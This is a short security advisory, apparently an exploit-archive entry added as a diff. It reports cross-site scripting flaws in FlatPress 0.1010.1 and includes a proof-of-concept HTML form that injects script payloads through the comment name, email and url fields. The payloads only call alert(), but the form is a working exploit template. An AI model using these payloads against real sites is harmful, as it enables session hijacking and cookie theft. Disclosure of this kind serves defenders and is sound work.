@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/48482/info
+
+FlatPress is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+FlatPress 0.1010.1 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/index.php?x=entry:entry110603-123922;comments:1" method="post">
+<input type="hidden" name="name" value=&#039;"><script>alert(1);</script>&#039;>
+<input type="hidden" name="email" value=&#039;"><script>alert(2);</script>&#039;>
+<input type="hidden" name="url" value=&#039;"><script>alert(3);</script>&#039;>
+<input name="send" value="EXPLOIT" type="submit">
+</form>
